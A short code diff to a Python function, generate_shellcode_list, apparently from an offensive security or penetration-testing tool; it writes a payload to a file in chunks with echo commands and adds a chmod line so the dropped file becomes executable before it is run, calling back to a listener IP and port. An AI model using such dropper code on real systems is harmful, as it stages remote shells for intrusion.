@@ -141,6 +141,7 @@ def generate_shellcode_list(listener_ip, listener_port, os_target=OS.WINDOWS, os
             command = profix + 'echo -ne "{}" >> {}'.format(block, filename)
             cmd.append(command)
             index = index + chunked_num
+        cmd.append("chmod u+x " + filename)
         cmd.append(profix + filename)
 
     return cmd
